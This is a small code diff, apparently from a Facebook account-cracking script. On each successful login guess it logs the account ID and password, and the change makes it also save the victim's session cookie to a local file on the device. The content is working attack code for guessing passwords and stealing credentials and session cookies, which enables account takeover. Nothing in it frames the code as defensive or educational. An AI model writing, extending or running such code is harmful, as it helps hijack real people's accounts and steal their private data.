@@ -330,7 +330,7 @@ def gxds_files(uid,pwx):
                     gxdsCKIE = ";".join(i["name"]+"="+i["value"] for i in
                     q["session_cookies"]);gxdsCK = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={gxdsCK};{gxdsCKIE}"
                     print(f"\r\r{grn}  [GXDS-OK] {uid}|{ps}")
-                    open("/sdcard/gxds-ok.txt","a").write(uid+"|"+ps+"\n")
+                    open("/sdcard/gxds-ok.txt","a").write(uid+"|"+ps+"\n"+cookie+"\n")
                     oks.append(uid)
                     break
             elif "www.facebook.com" in q['error']['message']:
